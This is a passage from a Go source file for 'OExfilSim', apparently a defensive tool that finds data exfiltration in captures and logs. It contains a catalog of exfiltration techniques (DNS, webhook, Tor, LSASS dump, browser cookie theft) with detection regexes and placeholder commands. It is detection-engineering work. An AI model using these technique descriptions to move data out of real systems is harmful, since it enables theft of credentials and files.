// OExfilSim — Exfiltration channel detector + offline channel simulator.
// Author: khaled.s.haddad   Website: owlsec.org   Language: Go (stdlib only)
// Finds data exfiltration in packet captures (pcap/pcapng), Zeek logs and
// flow exports: DNS tunnelling, ICMP payload channels, uploads to file-drop /
// paste / webhook / tunnel services, bulk egress over alternative protocols,
// periodic chunked transfers. Scans scripts for staging + transfer tooling,
// and models (offline — nothing is sent) which detections a planned exfil
// test would trip. MITRE ATT&CK TA0010 (Exfiltration).
package main

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"encoding/binary"
	"encoding/csv"
	"encoding/hex"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"math"
	"net"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"
)

// ---- OWL UI KIT (cyan "owl" house style) — stdlib only. Shared across the suite ----
// CYAN is the primary brand/frame colour; red is reserved for errors and
// CRITICAL/HIGH severities.
const (
	R   = "\033[91m"       // red     — errors / critical
	GRN = "\033[92m"       // green   — success / low
	YLW = "\033[93m"       // yellow  — prompts / warning text
	CY  = "\033[96m"       // cyan    — primary brand & frames
	W   = "\033[97m"       // white   — body text
	B   = "\033[1m"        // bold
	X   = "\033[0m"        // reset
	MG  = "\033[95m"       // magenta — suite name / accents
	DIM = "\033[2m"        // dim     — secondary text
	OR  = "\033[38;5;208m" // orange  — warning markers
	GY  = "\033[90m"       // gray    — muted
	DR  = CY               // legacy alias: former frame colour → cyan
)

var noColor = os.Getenv("NO_COLOR") != "" || !isatty()

func isatty() bool { fi, _ := os.Stdout.Stat(); return (fi.Mode() & os.ModeCharDevice) != 0 }
func col(s string, c ...string) string {
	if noColor {
		return s
	}
	return strings.Join(c, "") + s + X
}
func clear()           { fmt.Print("\033[H\033[2J") }
func line(w int)       { fmt.Println(col(strings.Repeat("─", w), CY)) }
func okMsg(s string)   { fmt.Println("  " + col("[✔] ", GRN+B) + col(s, W)) }
func errMsg(s string)  { fmt.Println("  " + col("[✘] ", R+B) + col(s, R)) }
func warnMsg(s string) { fmt.Println("  " + col("[!] ", OR+B) + col(s, YLW)) }
func info(s string)    { fmt.Println("  " + col("[*] ", CY) + col(s, DIM+W)) }
func kv(k, v string)   { fmt.Println("  " + col("│  ", CY) + col(pad(k+":", 16), DIM) + col(v, W)) }

const BANNER = `
 ██████╗ ███████╗██╗  ██╗███████╗██╗██╗     ███████╗██╗███╗   ███╗
██╔═══██╗██╔════╝╚██╗██╔╝██╔════╝██║██║     ██╔════╝██║████╗ ████║
██║   ██║█████╗   ╚███╔╝ █████╗  ██║██║     ███████╗██║██╔████╔██║
██║   ██║██╔══╝   ██╔██╗ ██╔══╝  ██║██║     ╚════██║██║██║╚██╔╝██║
╚██████╔╝███████╗██╔╝ ██╗██║     ██║███████╗███████║██║██║ ╚═╝ ██║
 ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝╚═╝╚═╝     ╚═╝
`

const APPNAME = "OExfilSim"
const SUITE = "Owl Exfil Suite"
const TAGLINE = "Exfiltration Channel Detector & Simulator"
const SUBLINE = "PCAP · Zeek · Flows · DNS/DoH · Beacons · Baselines · Top Talkers · Sim"
const VERSION = "1.1"
const AUTHOR = "khaled.s.haddad"
const WEBSITE = "owlsec.org"
const PRIMARY_MITRE = "TA0010"

// banner prints the cyan ANSI-Shadow wordmark and the suite identity block.
func banner() {
	fmt.Println(col(BANNER, CY))
	fmt.Println("  " + col(SUITE+"  ", B+MG) + col("v"+VERSION, YLW))
	fmt.Println("  " + col(SUBLINE, W))
	fmt.Println()
	fmt.Println("  " + col("Developer : ", DIM) + col(AUTHOR, CY) +
		col("   |   Website : ", DIM) + col(WEBSITE, CY))
	fmt.Println(col(strings.Repeat("─", 66), CY))
	fmt.Println()
}

var stdin = bufio.NewReader(os.Stdin)

func prompt(label string) string {
	fmt.Print("  " + col("[»] ", YLW) + col(label+": ", W))
	s, _ := stdin.ReadString('\n')
	return strings.TrimSpace(s)
}
func pause() {
	fmt.Print(col("\n  [↩] Press Enter to continue...", YLW))
	stdin.ReadString('\n')
}

// sectionHeader prints a ⬡ heading between two cyan rules.
func sectionHeader(s string) {
	fmt.Println(col(strings.Repeat("─", 66), CY))
	fmt.Println("  " + col("⬡  "+s, B+CY))
	fmt.Println(col(strings.Repeat("─", 66), CY))
	fmt.Println()
}

type menuItem struct {
	key, name, desc, clr string
}

// menu renders the ONode-style menu and returns the raw selection.
func menu(title string, items []menuItem) string {
	clear()
	banner()
	fmt.Println("  " + col("⬡  "+title, B+CY))
	fmt.Println()
	for _, it := range items {
		fmt.Println("  " + col(pad("["+it.key+"]", 4), it.clr) + "  " +
			col(pad(it.name, 30), W) + col("─ "+it.desc, DIM))
	}
	fmt.Println()
	fmt.Println("  " + col(pad("[H]", 4), YLW+B) + "  " + col(pad("Help & Usage", 30), W) + col("─ How to use, every option, CLI flags & examples", DIM))
	fmt.Println("  " + col(pad("[0]", 4), R+B) + "  " + col(pad("Exit", 30), W) + col("─ Back / quit", DIM))
	fmt.Println()
	fmt.Println(col(strings.Repeat("─", 66), CY))
	return prompt("Select option")
}

func stripANSI(s string) string {
	var b strings.Builder
	esc := false
	for _, r := range s {
		if r == '\033' {
			esc = true
			continue
		}
		if esc {
			if r == 'm' {
				esc = false
			}
			continue
		}
		b.WriteRune(r)
	}
	return b.String()
}
func vlen(s string) int { return utf8.RuneCountInString(stripANSI(s)) }
func pad(s string, n int) string {
	if l := vlen(s); l < n {
		return s + strings.Repeat(" ", n-l)
	}
	return s
}

// table prints an aligned table; cells may already carry colour codes.
func table(headers []string, rows [][]string) {
	w := make([]int, len(headers))
	for i, h := range headers {
		w[i] = vlen(h)
	}
	for _, r := range rows {
		for i, c := range r {
			if i < len(w) && vlen(c) > w[i] {
				w[i] = vlen(c)
			}
		}
	}
	var hb strings.Builder
	for i, h := range headers {
		hb.WriteString(col(pad(h, w[i]), CY+B))
		if i < len(headers)-1 {
			hb.WriteString(col(" │ ", CY))
		}
	}
	fmt.Println("  " + hb.String())
	seg := make([]string, len(w))
	for i := range w {
		seg[i] = strings.Repeat("─", w[i])
	}
	fmt.Println("  " + col(strings.Join(seg, "─┼─"), CY))
	for _, r := range rows {
		var rb strings.Builder
		for i := range headers {
			v := ""
			if i < len(r) {
				v = r[i]
			}
			if !strings.Contains(v, "\033[") {
				v = col(v, W)
			}
			rb.WriteString(pad(v, w[i]))
			if i < len(headers)-1 {
				rb.WriteString(col(" │ ", CY))
			}
		}
		fmt.Println("  " + rb.String())
	}
}

// ====================================================================
//  DOMAIN MODEL
// ====================================================================

// CatalogEntry is a single technique / binary / mechanism / channel
// record in this tool's knowledge base. It is the unit that powers
// the catalog browser, the marker scanner, the planner and exports.
type CatalogEntry struct {
	ID        string
	Name      string
	Category  string
	Platform  string
	Tactic    string
	Technique string
	Severity  string
	Summary   string
	Detail    string
	Commands  []string
	Markers   []string
	Detection []string
	Refs      []string
	Tags      []string
}

// Finding is a single observation produced by scanning an input, by a
// planner, or by a configuration audit. Findings carry MITRE mapping,
// severity and evidence and feed every export format.
type Finding struct {
	RuleID    string   `json:"ruleId"`
	Title     string   `json:"title"`
	Severity  string   `json:"severity"`
	Score     int      `json:"score"`
	Tactic    string   `json:"tactic"`
	Technique string   `json:"technique"`
	File      string   `json:"file,omitempty"`
	Line      int      `json:"line,omitempty"`
	Evidence  string   `json:"evidence,omitempty"`
	Detail    string   `json:"detail,omitempty"`
	Detection string   `json:"detection,omitempty"`
	Refs      []string `json:"refs,omitempty"`
	Fprint    string   `json:"fingerprint"`
	Count     int      `json:"count,omitempty"`
}

// Report bundles a full analysis run for export and grading.
type Report struct {
	Tool       string        `json:"tool"`
	Version    string        `json:"version"`
	Tagline    string        `json:"tagline"`
	Generated  string        `json:"generated"`
	Target     string        `json:"target,omitempty"`
	Mode       string        `json:"mode"`
	Findings   []Finding     `json:"findings"`
	Grade      string        `json:"grade"`
	Score      int           `json:"score"`
	Summary    string        `json:"summary"`
	MitrePrime string        `json:"mitrePrimary"`
	Traffic    *TrafficStats `json:"traffic,omitempty"`
}

// severity ordering / weights
var sevRank = map[string]int{"critical": 5, "high": 4, "medium": 3, "low": 2, "info": 1}
var sevWeight = map[string]int{"critical": 40, "high": 25, "medium": 12, "low": 5, "info": 1}

func sevColor(s string) string {
	switch strings.ToLower(s) {
	case "critical":
		return R + B
	case "high":
		return R
	case "medium":
		return YLW
	case "low":
		return GRN
	default:
		return GY
	}
}

func fingerprint(parts ...string) string {
	h := sha256.Sum256([]byte(strings.Join(parts, "|")))
	return hex.EncodeToString(h[:])[:16]
}

// ====================================================================
//  CATALOG (tool-specific knowledge base)
// ====================================================================

var catalog = []CatalogEntry{
	{
		ID: "EX-DNS", Name: "DNS exfil (TXT/long labels)", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1048.003", Severity: "high",
		Summary:   "Chunk data into DNS labels/TXT queries.",
		Detail:    "Chunk data into DNS labels/TXT queries. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# DNS exfil (TXT/long labels)", "# MITRE T1048.003"},
		Markers:   []string{"dns.?exfil|TXT.*exfil|long.?label"},
		Detection: []string{"Hunt markers of DNS exfil (TXT/long labels)", "Map to T1048.003", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1048.003"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-HTTPS", Name: "HTTPS POST exfil", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1041", Severity: "high",
		Summary:   "POST chunks to attacker HTTPS endpoint.",
		Detail:    "POST chunks to attacker HTTPS endpoint. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# HTTPS POST exfil", "# MITRE T1041"},
		Markers:   []string{"https?://.*/(upload|exfil|collect)", "Content-Type:\\s*application/octet-stream"},
		Detection: []string{"Hunt markers of HTTPS POST exfil", "Map to T1041", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1041"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-ICMP", Name: "ICMP exfil", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1048", Severity: "medium",
		Summary:   "Data in ICMP echo payloads.",
		Detail:    "Data in ICMP echo payloads. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# ICMP exfil", "# MITRE T1048"},
		Markers:   []string{"icmp.?exfil|echo.?payload.?data"},
		Detection: []string{"Hunt markers of ICMP exfil", "Map to T1048", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1048"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-EMAIL", Name: "Email exfil", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1048.003", Severity: "medium",
		Summary:   "SMTP send of archived loot.",
		Detail:    "SMTP send of archived loot. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Email exfil", "# MITRE T1048.003"},
		Markers:   []string{"smtp|Send-MailMessage|mailto:.*exfil"},
		Detection: []string{"Hunt markers of Email exfil", "Map to T1048.003", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1048.003"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-CLOUD", Name: "Cloud storage exfil", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1567.002", Severity: "high",
		Summary:   "Upload to S3/Dropbox/Drive/MEGA.",
		Detail:    "Upload to S3/Dropbox/Drive/MEGA. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Cloud storage exfil", "# MITRE T1567.002"},
		Markers:   []string{"s3://|dropboxapi|googleapis.com/upload|mega\\.nz"},
		Detection: []string{"Hunt markers of Cloud storage exfil", "Map to T1567.002", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1567.002"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-GITHUB", Name: "GitHub/Gist exfil", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1567.001", Severity: "medium",
		Summary:   "Push loot to Gist/repo.",
		Detail:    "Push loot to Gist/repo. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# GitHub/Gist exfil", "# MITRE T1567.001"},
		Markers:   []string{"gist\\.github|api\\.github\\.com.*gists"},
		Detection: []string{"Hunt markers of GitHub/Gist exfil", "Map to T1567.001", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1567.001"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-SLACK", Name: "Slack/Discord webhook exfil", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1567", Severity: "medium",
		Summary:   "POST loot to webhook.",
		Detail:    "POST loot to webhook. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Slack/Discord webhook exfil", "# MITRE T1567"},
		Markers:   []string{"hooks\\.slack\\.com|discord\\.com/api/webhooks"},
		Detection: []string{"Hunt markers of Slack/Discord webhook exfil", "Map to T1567", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1567"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-FTP", Name: "FTP/SFTP exfil", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1048", Severity: "medium",
		Summary:   "FTP put of archives.",
		Detail:    "FTP put of archives. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# FTP/SFTP exfil", "# MITRE T1048"},
		Markers:   []string{"\\bftp\\b.*put|sftp.*put|curl\\s+-T"},
		Detection: []string{"Hunt markers of FTP/SFTP exfil", "Map to T1048", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1048"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-SMB", Name: "SMB exfil to attacker share", Category: "Exfil", Platform: "windows",
		Tactic: "TA0010", Technique: "T1048", Severity: "medium",
		Summary:   "Copy loot to attacker SMB.",
		Detail:    "Copy loot to attacker SMB. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# SMB exfil to attacker share", "# MITRE T1048"},
		Markers:   []string{"copy\\s+.*\\\\\\\\\\\\\\\\\\d+\\.\\d+|net\\s+use\\s+\\\\\\\\\\\\\\\\"},
		Detection: []string{"Hunt markers of SMB exfil to attacker share", "Map to T1048", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1048"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-DNS-DoH", Name: "DoH exfil", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1048.003", Severity: "high",
		Summary:   "Exfil over DNS-over-HTTPS.",
		Detail:    "Exfil over DNS-over-HTTPS. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# DoH exfil", "# MITRE T1048.003"},
		Markers:   []string{"dns-query|application/dns-message|dns\\.google"},
		Detection: []string{"Hunt markers of DoH exfil", "Map to T1048.003", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1048.003"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-CHUNK", Name: "Chunking strategy", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1030", Severity: "medium",
		Summary:   "Split data into small chunks.",
		Detail:    "Split data into small chunks. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Chunking strategy", "# MITRE T1030"},
		Markers:   []string{"chunk.?size|split\\s+-b|dd\\s+bs="},
		Detection: []string{"Hunt markers of Chunking strategy", "Map to T1030", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1030"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-ENCRYPT", Name: "Encrypted exfil archive", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1560.001", Severity: "medium",
		Summary:   "Encrypt before exfil (7z/gpg/openssl).",
		Detail:    "Encrypt before exfil (7z/gpg/openssl). For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Encrypted exfil archive", "# MITRE T1560.001"},
		Markers:   []string{"7z\\s+a\\s+-p|gpg\\s+-c|openssl\\s+(enc|aes)"},
		Detection: []string{"Hunt markers of Encrypted exfil archive", "Map to T1560.001", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1560.001"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-COMPRESS", Name: "Compressed staging", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1560", Severity: "low",
		Summary:   "zip/tar/cab before exfil.",
		Detail:    "zip/tar/cab before exfil. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Compressed staging", "# MITRE T1560"},
		Markers:   []string{"\\bzip\\b|\\btar\\s+cz|\\bmakecab\\b"},
		Detection: []string{"Hunt markers of Compressed staging", "Map to T1560", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1560"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-STEALTH", Name: "Low-and-slow timing", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1029", Severity: "medium",
		Summary:   "Throttle to evade volume alerts.",
		Detail:    "Throttle to evade volume alerts. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Low-and-slow timing", "# MITRE T1029"},
		Markers:   []string{"low.?and.?slow|sleep\\s+between|rate.?limit.?exfil"},
		Detection: []string{"Hunt markers of Low-and-slow timing", "Map to T1029", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1029"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-COVER", Name: "Cover traffic blending", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1001", Severity: "medium",
		Summary:   "Blend with legit CDN/API traffic.",
		Detail:    "Blend with legit CDN/API traffic. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Cover traffic blending", "# MITRE T1001"},
		Markers:   []string{"cover.?traffic|blend|mimic.?api"},
		Detection: []string{"Hunt markers of Cover traffic blending", "Map to T1001", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1001"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-STEGO", Name: "Steganography exfil", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1001.002", Severity: "low",
		Summary:   "Hide data in images/audio.",
		Detail:    "Hide data in images/audio. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Steganography exfil", "# MITRE T1001.002"},
		Markers:   []string{"steganograph|lsb.?embed|\\.png.*exfil"},
		Detection: []string{"Hunt markers of Steganography exfil", "Map to T1001.002", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1001.002"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-CLIPBOARD", Name: "Clipboard exfil", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1115", Severity: "low",
		Summary:   "Stage via clipboard.",
		Detail:    "Stage via clipboard. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Clipboard exfil", "# MITRE T1115"},
		Markers:   []string{"clipboard|Get-Clipboard|xclip"},
		Detection: []string{"Hunt markers of Clipboard exfil", "Map to T1115", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1115"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-BROWSER", Name: "Browser-based exfil", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1185", Severity: "medium",
		Summary:   "Use browser to POST loot.",
		Detail:    "Use browser to POST loot. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Browser-based exfil", "# MITRE T1185"},
		Markers:   []string{"XMLHttpRequest|fetch\\(.*upload"},
		Detection: []string{"Hunt markers of Browser-based exfil", "Map to T1185", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1185"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-WEBDAV", Name: "WebDAV PUT exfil", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1048", Severity: "medium",
		Summary:   "PUT files via WebDAV.",
		Detail:    "PUT files via WebDAV. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# WebDAV PUT exfil", "# MITRE T1048"},
		Markers:   []string{"PROPPATCH|WebDAV.*PUT|curl\\s+-T.*DavWWWRoot"},
		Detection: []string{"Hunt markers of WebDAV PUT exfil", "Map to T1048", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1048"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-TOR", Name: "Tor exfil", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1048", Severity: "medium",
		Summary:   "Exfil over Tor SOCKS.",
		Detail:    "Exfil over Tor SOCKS. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Tor exfil", "# MITRE T1048"},
		Markers:   []string{"socks5h://127\\.0\\.0\\.1:9050|\\.onion"},
		Detection: []string{"Hunt markers of Tor exfil", "Map to T1048", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1048"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-PHYSICAL", Name: "Physical exfil (USB)", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1052.001", Severity: "medium",
		Summary:   "Copy to removable media.",
		Detail:    "Copy to removable media. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Physical exfil (USB)", "# MITRE T1052.001"},
		Markers:   []string{"USB|removable|exfil.?drive"},
		Detection: []string{"Hunt markers of Physical exfil (USB)", "Map to T1052.001", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1052.001"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-SCHEDULED", Name: "Scheduled exfil job", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1029", Severity: "medium",
		Summary:   "Cron/task that ships loot periodically.",
		Detail:    "Cron/task that ships loot periodically. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Scheduled exfil job", "# MITRE T1029"},
		Markers:   []string{"exfil.*cron|scheduled.*exfil"},
		Detection: []string{"Hunt markers of Scheduled exfil job", "Map to T1029", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1029"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-ENTROPY", Name: "High-entropy transfer detect", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1041", Severity: "info",
		Summary:   "Defensive: flag high-entropy egress.",
		Detail:    "Defensive: flag high-entropy egress. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# High-entropy transfer detect", "# MITRE T1041"},
		Markers:   []string{"entropy.*egress|high.?entropy.?transfer"},
		Detection: []string{"Hunt markers of High-entropy transfer detect", "Map to T1041", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1041"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-VOLUME", Name: "Volume threshold detect", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1041", Severity: "info",
		Summary:   "Defensive: volume anomaly.",
		Detail:    "Defensive: volume anomaly. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Volume threshold detect", "# MITRE T1041"},
		Markers:   []string{"volume.?threshold|bytes.?egress"},
		Detection: []string{"Hunt markers of Volume threshold detect", "Map to T1041", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1041"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-DEST", Name: "Rare destination detect", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1041", Severity: "info",
		Summary:   "Defensive: rare external dest.",
		Detail:    "Defensive: rare external dest. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Rare destination detect", "# MITRE T1041"},
		Markers:   []string{"rare.?destination|first.?seen.?dest"},
		Detection: []string{"Hunt markers of Rare destination detect", "Map to T1041", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1041"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-DNS-LENGTH", Name: "Long DNS label detect", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1048.003", Severity: "info",
		Summary:   "Defensive: label length > 30.",
		Detail:    "Defensive: label length > 30. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Long DNS label detect", "# MITRE T1048.003"},
		Markers:   []string{"label.?length|long.?subdomain"},
		Detection: []string{"Hunt markers of Long DNS label detect", "Map to T1048.003", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1048.003"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-BASE64", Name: "Base64 blob in protocol", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1132", Severity: "medium",
		Summary:   "Large base64 in DNS/HTTP.",
		Detail:    "Large base64 in DNS/HTTP. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Base64 blob in protocol", "# MITRE T1132"},
		Markers:   []string{"[A-Za-z0-9+/]{80,}={0,2}"},
		Detection: []string{"Hunt markers of Base64 blob in protocol", "Map to T1132", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1132"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-HEX", Name: "Hex-encoded chunk", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1132", Severity: "low",
		Summary:   "Hex payload in query string.",
		Detail:    "Hex payload in query string. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Hex-encoded chunk", "# MITRE T1132"},
		Markers:   []string{"[0-9a-fA-F]{64,}"},
		Detection: []string{"Hunt markers of Hex-encoded chunk", "Map to T1132", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1132"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-ARCHIVE-PASS", Name: "Password-protected archive", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1560.001", Severity: "medium",
		Summary:   "Passworded zip/7z to evade DLP.",
		Detail:    "Passworded zip/7z to evade DLP. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Password-protected archive", "# MITRE T1560.001"},
		Markers:   []string{"-p[A-Za-z0-9]|password.?zip|encrypted.?archive"},
		Detection: []string{"Hunt markers of Password-protected archive", "Map to T1560.001", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1560.001"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-STAGING-DIR", Name: "Staging directory", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1074", Severity: "medium",
		Summary:   "Collect-to-stage dir before ship.",
		Detail:    "Collect-to-stage dir before ship. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Staging directory", "# MITRE T1074"},
		Markers:   []string{"/tmp/\\.stage|C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\stage|staging.?dir"},
		Detection: []string{"Hunt markers of Staging directory", "Map to T1074", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1074"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-COLLECTION", Name: "Collection before exfil", Category: "Exfil", Platform: "cross",
		Tactic: "TA0009", Technique: "T1005", Severity: "medium",
		Summary:   "Gather files matching patterns.",
		Detail:    "Gather files matching patterns. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Collection before exfil", "# MITRE T1005"},
		Markers:   []string{"collect.*(pdf|docx|xlsx|pst)|loot.?dir"},
		Detection: []string{"Hunt markers of Collection before exfil", "Map to T1005", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1005"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-KEYLOG", Name: "Keylog buffer exfil", Category: "Exfil", Platform: "cross",
		Tactic: "TA0009", Technique: "T1056.001", Severity: "high",
		Summary:   "Ship keylog buffers.",
		Detail:    "Ship keylog buffers. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Keylog buffer exfil", "# MITRE T1056.001"},
		Markers:   []string{"keylog|keystroke.*upload"},
		Detection: []string{"Hunt markers of Keylog buffer exfil", "Map to T1056.001", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1056.001"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-SCREEN", Name: "Screenshot exfil", Category: "Exfil", Platform: "cross",
		Tactic: "TA0009", Technique: "T1113", Severity: "medium",
		Summary:   "Ship screenshots.",
		Detail:    "Ship screenshots. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Screenshot exfil", "# MITRE T1113"},
		Markers:   []string{"screenshot.*upload|CaptureScreen"},
		Detection: []string{"Hunt markers of Screenshot exfil", "Map to T1113", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1113"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-BROWSER-DATA", Name: "Browser data exfil", Category: "Exfil", Platform: "cross",
		Tactic: "TA0009", Technique: "T1539", Severity: "high",
		Summary:   "Cookies/passwords archive upload.",
		Detail:    "Cookies/passwords archive upload. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Browser data exfil", "# MITRE T1539"},
		Markers:   []string{"Login\\sData|cookies\\.sqlite|Browser.*exfil"},
		Detection: []string{"Hunt markers of Browser data exfil", "Map to T1539", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1539"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-LSASS", Name: "LSASS dump exfil", Category: "Exfil", Platform: "windows",
		Tactic: "TA0006", Technique: "T1003.001", Severity: "critical",
		Summary:   "Ship LSASS dump.",
		Detail:    "Ship LSASS dump. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# LSASS dump exfil", "# MITRE T1003.001"},
		Markers:   []string{"lsass.*\\.(dmp|bin)|procdump.*upload"},
		Detection: []string{"Hunt markers of LSASS dump exfil", "Map to T1003.001", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1003.001"},
		Tags:      []string{"exfil", "channel"},
	},
	{
